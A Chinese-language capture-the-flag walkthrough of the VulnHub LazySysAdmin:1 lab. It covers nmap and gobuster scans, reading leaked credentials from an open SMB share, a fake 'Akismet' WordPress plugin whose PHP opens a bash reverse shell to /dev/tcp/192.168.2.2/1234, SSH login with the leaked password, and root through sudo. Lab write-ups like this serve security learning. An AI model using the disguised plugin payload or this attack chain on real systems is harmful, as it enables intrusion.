# LazySysAdmin:1主机渗透实现

- 靶机地址:https://www.vulnhub.com/entry/lazysysadmin-1,205/
- 下载地址:https://download.vulnhub.com/lazysysadmin/Lazysysadmin.zip



## 信息收集:

### 主机发现

- 当前IP段:`192.168.2.0/24`,当前主机IP:`192.168.2.2`

- ```shell
  └─$ sudo nmap -sn --min-rate 10000 192.168.2.1/24                              
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 23:04 EDT
  Nmap scan report for 192.168.2.1
  Host is up (0.0044s latency).
  MAC Address: 00:50:56:C0:00:01 (VMware)
  Nmap scan report for 192.168.2.12
  Host is up (0.00015s latency).
  MAC Address: 00:0C:29:03:A2:FF (VMware)
  Nmap scan report for 192.168.2.254
  Host is up (0.00011s latency).
  MAC Address: 00:50:56:E4:FB:DB (VMware)
  Nmap scan report for 192.168.2.2
  Host is up.
  Nmap done: 256 IP addresses (4 hosts up) scanned in 13.33 seconds
  ```

- 靶机IP:`192.168.2.12`

### 端口扫描

- TCP端口扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.2.12 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 23:06 EDT
  Nmap scan report for 192.168.2.12
  Host is up (0.0024s latency).
  Not shown: 65529 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  80/tcp   open  http
  139/tcp  open  netbios-ssn
  445/tcp  open  microsoft-ds
  3306/tcp open  mysql
  6667/tcp open  irc
  MAC Address: 00:0C:29:03:A2:FF (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds
  ```

- UDP端口扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.2.12 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 23:06 EDT
  Warning: 192.168.2.12 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.2.12
  Host is up (0.00091s latency).
  Not shown: 65456 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
  PORT    STATE SERVICE
  137/udp open  netbios-ns
  MAC Address: 00:0C:29:03:A2:FF (VMware)
  
  Nmap done: 1 IP address (1 host up) scanned in 79.39 seconds
  ```



### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,80,139,445,3306,6667 192.168.2.12 -oA Nmap-scan/sC
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 23:08 EDT
  Nmap scan report for 192.168.2.12
  Host is up (0.00030s latency).
  
  PORT     STATE SERVICE     VERSION
  22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)
  |   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)
  |   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)
  |_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)
  80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
  | http-robots.txt: 4 disallowed entries 
  |_/old/ /test/ /TR2/ /Backnode_files/
  |_http-server-header: Apache/2.4.7 (Ubuntu)
  |_http-generator: Silex v2.2.7
  |_http-title: Backnode
  139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
  445/tcp  open  �           Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
  3306/tcp open  mysql       MySQL (unauthorized)
  6667/tcp open  irc         InspIRCd
  | irc-info: 
  |   server: Admin.local
  |   users: 1
  |   servers: 1
  |   chans: 0
  |   lusers: 1
  |   lservers: 0
  |   source ident: nmap
  |   source host: 192.168.2.2
  |_  error: Closing link: (nmap@192.168.2.2) [Client exited]
  MAC Address: 00:0C:29:03:A2:FF (VMware)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running: Linux 3.X|4.X
  OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
  OS details: Linux 3.2 - 4.9
  Network Distance: 1 hop
  Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Host script results:
  | smb-security-mode: 
  |   account_used: guest
  |   authentication_level: user
  |   challenge_response: supported
  |_  message_signing: disabled (dangerous, but default)
  | smb2-time: 
  |   date: 2023-08-22T11:09:00
  |_  start_date: N/A
  |_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
  |_clock-skew: mean: 4h40m01s, deviation: 5h46m24s, median: 8h00m00s
  | smb-os-discovery: 
  |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
  |   Computer name: lazysysadmin
  |   NetBIOS computer name: LAZYSYSADMIN\x00
  |   Domain name: \x00
  |   FQDN: lazysysadmin
  |_  System time: 2023-08-22T21:09:00+10:00
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 50.28 seconds
  ```



### 默认漏洞脚本扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,80,137,139,445,3306,6667 192.168.2.12 -oA Nmap-scan/Script
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 23:17 EDT
  Nmap scan report for 192.168.2.12
  Host is up (0.00030s latency).
  
  PORT     STATE  SERVICE
  22/tcp   open   ssh
  80/tcp   open   http
  | http-sql-injection: 
  |   Possible sqli for queries:
  |     http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DD%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=M%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=D%3BO%3DA%27%20OR%20sqlspider
  |     http://192.168.2.12:80/Backnode_files/?C=S%3BO%3DA%27%20OR%20sqlspider
  |_    http://192.168.2.12:80/Backnode_files/?C=N%3BO%3DA%27%20OR%20sqlspider
  |_http-dombased-xss: Couldn't find any DOM based XSS.
  | http-slowloris-check: 
  |   VULNERABLE:
  |   Slowloris DOS attack
  |     State: LIKELY VULNERABLE
  |     IDs:  CVE:CVE-2007-6750
  |       Slowloris tries to keep many connections to the target web server open and hold
  |       them open as long as possible.  It accomplishes this by opening connections to
  |       the target web server and sending a partial request. By doing so, it starves
  |       the http server's resources causing Denial Of Service.
  |       
  |     Disclosure date: 2009-09-17
  |     References:
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
  |_      http://ha.ckers.org/slowloris/
  |_http-csrf: Couldn't find any CSRF vulnerabilities.
  |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
  | http-enum: 
  |   /wordpress/: Blog
  |   /test/: Test page
  |   /robots.txt: Robots file
  |   /info.php: Possible information file
  |   /phpmyadmin/: phpMyAdmin
  |   /wordpress/wp-login.php: Wordpress login page.
  |   /apache/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
  |_  /old/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
  137/tcp  closed netbios-ns
  139/tcp  open   netbios-ssn
  445/tcp  open   microsoft-ds
  3306/tcp open   mysql
  6667/tcp open   irc
  |_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait set to 100 (or higher if you get this message again).
  | irc-botnet-channels: 
  |_  ERROR: TIMEOUT
  MAC Address: 00:0C:29:03:A2:FF (VMware)
  
  Host script results:
  |_smb-vuln-ms10-054: false
  |_smb-vuln-ms10-061: false
  | smb-vuln-regsvc-dos: 
  |   VULNERABLE:
  |   Service regsvc in Microsoft Windows systems vulnerable to denial of service
  |     State: VULNERABLE
  |       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
  |       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
  |       while working on smb-enum-sessions.
  |_          
  
  Nmap done: 1 IP address (1 host up) scanned in 328.34 seconds
  ```



## web信息收集:

- 首页展示:`192.168.2.12`
- ![image-20230822112800634](https://raw.githubusercontent.com/r0o983/images/main/202308221128735.png)
- 首页展示:`192.168.2.12/wordpress`
- ![image-20230822112844076](https://raw.githubusercontent.com/r0o983/images/main/202308221128170.png)

### gobuster扫描

```shell
└─$ sudo gobuster dir -u http://192.168.2.12 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster -x txt,php,sql
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.12
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,sql
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 283]
/info.php             (Status: 200) [Size: 77159]
/wordpress            (Status: 301) [Size: 315] [--> http://192.168.2.12/wordpress/]
/test                 (Status: 301) [Size: 310] [--> http://192.168.2.12/test/]
/wp                   (Status: 301) [Size: 308] [--> http://192.168.2.12/wp/]
/apache               (Status: 301) [Size: 312] [--> http://192.168.2.12/apache/]
/old                  (Status: 301) [Size: 309] [--> http://192.168.2.12/old/]
/javascript           (Status: 301) [Size: 316] [--> http://192.168.2.12/javascript/]
/robots.txt           (Status: 200) [Size: 92]
/phpmyadmin           (Status: 301) [Size: 316] [--> http://192.168.2.12/phpmyadmin/]
/.php                 (Status: 403) [Size: 283]
/server-status        (Status: 403) [Size: 292]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

- `wordpress`默认的后台管理员地址为:`wp-admin`,或`wp-login`一般都会重定向到这里.

## smb共享服务

- 尝试访问`smb`共享`smbclient -L 192.168.2.12`,使用空密码进行连接

- Ps:这里的smb共享命令需要先指定-L参数,如果在IP地址后指定-L参数会发现无法正常访问

- ```shell
  └─$ sudo smbclient -L 192.168.2.12
  Password for [WORKGROUP\root]:
  
          Sharename       Type      Comment
          ---------       ----      -------
          print$          Disk      Printer Drivers
          share$          Disk      Sumshare
          IPC$            IPC       IPC Service (Web server)
  Reconnecting with SMB1 for workgroup listing.
  
          Server               Comment
          ---------            -------
  
          Workgroup            Master
          ---------            -------
          WORKGROUP            LAZYSYSADMI
  ```

- 进入当前`share$`文件夹下查找有价值的文件

- 在读取`deets.txt`文件时,发现有一个默认密码为:12345.提示在密码更新后删除该文件,但是文件还存在,说明密码可能还未被修改

- ```shell
  └─$ cat deets.txt   
  CBF Remembering all these passwords.
  
  Remember to remove this file and update your password after we push out the server.
  
  Password 12345
  ```

- 在进入`wordpress`文件夹后可以直接看到当前数据库的用户名及密码,尝试登录后台

- ```shell
  └─$ sudo smbclient '\\192.168.2.12\share$'
  Password for [WORKGROUP\root]:
  Try "help" to get a list of possible commands.
  smb: \> ls
    .                                   D        0  Tue Aug 15 07:05:52 2017
    ..                                  D        0  Mon Aug 14 08:34:47 2017
    wordpress                           D        0  Tue Aug 15 07:21:08 2017
    Backnode_files                      D        0  Mon Aug 14 08:08:26 2017
    wp                                  D        0  Tue Aug 15 06:51:23 2017
    deets.txt                           N      139  Mon Aug 14 08:20:05 2017
    robots.txt                          N       92  Mon Aug 14 08:36:14 2017
    todolist.txt                        N       79  Mon Aug 14 08:39:56 2017
    apache                              D        0  Mon Aug 14 08:35:19 2017
    index.html                          N    36072  Sun Aug  6 01:02:15 2017
    info.php                            N       20  Tue Aug 15 06:55:19 2017
    test                                D        0  Mon Aug 14 08:35:10 2017
    old                                 D        0  Mon Aug 14 08:35:13 2017
  
                  3029776 blocks of size 1024. 1341644 blocks available
  smb: \> cd wordpress\
  smb: \wordpress\> ls
    .                                   D        0  Tue Aug 15 07:21:08 2017
    ..                                  D        0  Tue Aug 15 07:05:52 2017
    wp-config-sample.php                N     2853  Wed Dec 16 04:58:26 2015
    wp-trackback.php                    N     4513  Fri Oct 14 15:39:28 2016
    wp-admin                            D        0  Wed Aug  2 17:02:02 2017
    wp-settings.php                     N    16200  Thu Apr  6 14:01:42 2017
    wp-blog-header.php                  N      364  Sat Dec 19 06:20:28 2015
    index.php                           N      418  Tue Sep 24 20:18:11 2013
    wp-cron.php                         N     3286  Sun May 24 13:26:25 2015
    wp-links-opml.php                   N     2422  Sun Nov 20 21:46:30 2016
    readme.html                         N     7413  Mon Dec 12 03:01:39 2016
    wp-signup.php                       N    29924  Tue Jan 24 06:08:42 2017
    wp-content                          D        0  Mon Aug 21 06:07:27 2017
    license.txt                         N    19935  Mon Jan  2 12:58:42 2017
    wp-mail.php                         N     8048  Wed Jan 11 00:13:43 2017
    wp-activate.php                     N     5447  Tue Sep 27 17:36:28 2016
    .htaccess                           H       35  Tue Aug 15 07:40:13 2017
    xmlrpc.php                          N     3065  Wed Aug 31 12:31:29 2016
    wp-login.php                        N    34327  Fri May 12 13:12:46 2017
    wp-load.php                         N     3301  Mon Oct 24 23:15:30 2016
    wp-comments-post.php                N     1627  Mon Aug 29 08:00:32 2016
    wp-config.php                       N     3703  Mon Aug 21 05:25:14 2017
    wp-includes                         D        0  Wed Aug  2 17:02:03 2017
  
                  3029776 blocks of size 1024. 1341636 blocks available
  smb: \wordpress\> mget wp-config.php
  Get file wp-config.php? y
  getting file \wordpress\wp-config.php of size 3703 as wp-config.php (1808.0 KiloBytes/sec) (average 549.8 KiloBytes/sec)
  ```

- ![image-20230822153459459](https://raw.githubusercontent.com/r0o983/images/main/202308221534557.png)

### 获得`www-data`初始shell

- 标准流程:上传插件,使用插件来获得反弹shell

  1. 将本地的反弹shell打包为`zip`格式进行上传 `zip 打包后的名字.zip 原始文件名.sh`

  2. ```shell
     <?php 
     
     /**
      * @package r0o983
      */
     /*
     Plugin Name: Akismet Anti-Spam
     Plugin URI: https://akismet.com/
     Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. It keeps your site protected even while you sleep. To get started: activate the Akismet plugin and then go to your Akismet Settings page to set up your API key.
     Version: 3.3.3
     Author: Automattic
     Author URI: https://automattic.com/wordpress-plugins/
     License: GPLv2 or later
     Text Domain: akismet
      */
     ### 上半部分为需要填充的字符...没什么实际意义.
     
     <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.2/1234 0>&1'"); ?>
     
     ?>
     ```

  3. 开启监听,等待反弹shell连接

  4. ```shell
     └─$ nc -nvlp 1234                                                                          
     listening on [any] 1234 ...
     connect to [192.168.2.2] from (UNKNOWN) [192.168.2.12] 44476
     bash: cannot set terminal process group (1175): Inappropriate ioctl for device
     bash: no job control in this shell
     www-data@LazySysAdmin:/var/www/html/wordpress/wp-admin$ uname -a
     uname -a
     Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
     www-data@LazySysAdmin:/var/www/html/wordpress/wp-admin$ whoami
     whoami
     www-data
     www-data@LazySysAdmin:/var/www/html/wordpress/wp-admin$ ip a
     ip a
     1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
         link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
         inet 127.0.0.1/8 scope host lo
            valid_lft forever preferred_lft forever
         inet6 ::1/128 scope host 
            valid_lft forever preferred_lft forever
     2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
         link/ether 00:0c:29:03:a2:ff brd ff:ff:ff:ff:ff:ff
         inet 192.168.2.12/24 brd 192.168.2.255 scope global eth0
            valid_lft forever preferred_lft forever
         inet6 fe80::20c:29ff:fe03:a2ff/64 scope link 
            valid_lft forever preferred_lft forever
     www-data@LazySysAdmin:/var/www/html/wordpress/wp-admin$ sudo -l
     sudo -l
     sudo: no tty present and no askpass program specified
     www-data@LazySysAdmin:/var/www/html/wordpress/wp-admin$ cat /etc/crontab
     cat /etc/crontab
     # /etc/crontab: system-wide crontab
     # Unlike any other crontab you don't have to run the `crontab'
     # command to install the new version when you edit this file
     # and files in /etc/cron.d. These files also have username fields,
     # that none of the other crontabs do.
     
     SHELL=/bin/sh
     PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
     
     # m h dom mon dow user  command
     17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
     25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
     47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
     52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
     #
     www-data@LazySysAdmin:/var/www/html/wordpress/wp-admin$ 
     ```

## 获得初始shell

- 之前在`wordpress`主页中的一篇文章,其内容为`My name is togie`,并且重复多遍-->猜测`togie`可能是刚才我们在`deets.txt`文件中发现的密码对应的用户名,使用ssh尝试登录,成功使用密码:`12345`登录系统

- ```shell
  └─$ ssh togie@192.168.2.12     
  The authenticity of host '192.168.2.12 (192.168.2.12)' can't be established.
  ED25519 key fingerprint is SHA256:95rO1jtge1Ag8dmmSGET2f806aQjiTODoBpDoEeefaw.
  This key is not known by any other names.
  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
  Warning: Permanently added '192.168.2.12' (ED25519) to the list of known hosts.
  ##################################################################################################
  #                                          Welcome to Web_TR1                                    #
  #                             All connections are monitored and recorded                         # 
  #                    Disconnect IMMEDIATELY if you are not an authorized user!                   # 
  ##################################################################################################
  
  togie@192.168.2.12's password: 
  Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
  
   * Documentation:  https://help.ubuntu.com/
  
    System information as of Tue Aug 22 23:44:20 AEST 2023
  
    System load:  0.0               Processes:           175
    Usage of /:   50.0% of 2.89GB   Users logged in:     0
    Memory usage: 53%               IP address for eth0: 192.168.2.12
    Swap usage:   0%
  
    Graph this data and manage this system at:
      https://landscape.canonical.com/
  
  133 packages can be updated.
  0 updates are security updates.
  
  togie@LazySysAdmin:~$ uname -a
  Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
  togie@LazySysAdmin:~$ whoami
  togie
  togie@LazySysAdmin:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
      link/ether 00:0c:29:03:a2:ff brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.12/24 brd 192.168.2.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe03:a2ff/64 scope link 
         valid_lft forever preferred_lft forever
  togie@LazySysAdmin:~$ ls -lhai
  total 24K
    720 drwxr-xr-x 3 togie togie 4.0K Aug 15  2017 .
    758 drwxr-xr-x 3 root  root  4.0K Aug 14  2017 ..
  34865 -rw-r--r-- 1 togie togie  220 Aug 14  2017 .bash_logout
  34871 -rw-r--r-- 1 togie togie 3.6K Aug 14  2017 .bashrc
  37880 drwx------ 2 togie togie 4.0K Aug 14  2017 .cache
  37872 -rw-r--r-- 1 togie togie  675 Aug 14  2017 .profile
  togie@LazySysAdmin:~$ sudo -l
  [sudo] password for togie: 
  Matching Defaults entries for togie on LazySysAdmin:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  
  User togie may run the following commands on LazySysAdmin:
      (ALL : ALL) ALL
  ```

## 提权

- 直接使用`sudo bin/bash`即可完成操作.-->读取`root`用户flag

- ```shell
  togie@LazySysAdmin:~$ sudo /bin/bash
  root@LazySysAdmin:~# ls -lhai
  total 24K
    720 drwxr-xr-x 3 togie togie 4.0K Aug 15  2017 .
    758 drwxr-xr-x 3 root  root  4.0K Aug 14  2017 ..
  34865 -rw-r--r-- 1 togie togie  220 Aug 14  2017 .bash_logout
  34871 -rw-r--r-- 1 togie togie 3.6K Aug 14  2017 .bashrc
  37880 drwx------ 2 togie togie 4.0K Aug 14  2017 .cache
  37872 -rw-r--r-- 1 togie togie  675 Aug 14  2017 .profile
  root@LazySysAdmin:~# cd /root/
  root@LazySysAdmin:/root# ls -lhai
  total 28K
   1103 drwx------  3 root root 4.0K Aug 15  2017 .
      2 drwxr-xr-x 22 root root 4.0K Aug 21  2017 ..
  37887 -rw-------  1 root root 1000 Aug 21  2017 .bash_history
   1104 -rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc
  40640 drwx------  2 root root 4.0K Aug 14  2017 .cache
   1105 -rw-r--r--  1 root root  140 Feb 20  2014 .profile
    603 -rw-r--r--  1 root root  347 Aug 21  2017 proof.txt
  root@LazySysAdmin:/root# cat proof.txt 
  WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
  
  
  Well done :)
  
  Hope you learn't a few things along the way.
  
  Regards,
  
  Togie Mcdogie
  
  
  
  
  Enjoy some random strings
  
  WX6k7NJtA8gfk*w5J3&T@*Ga6!0o5UP89hMVEQ#PT9851
  2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7
  pf%&1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02
  bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu
  root@LazySysAdmin:/root# ip a 
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
      link/ether 00:0c:29:03:a2:ff brd ff:ff:ff:ff:ff:ff
      inet 192.168.2.12/24 brd 192.168.2.255 scope global eth0
         valid_lft forever preferred_lft forever
      inet6 fe80::20c:29ff:fe03:a2ff/64 scope link 
         valid_lft forever preferred_lft forever
  root@LazySysAdmin:/root# whoami
  root
  root@LazySysAdmin:/root# uname -a
  Linux LazySysAdmin 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
  root@LazySysAdmin:/root# 
  ```
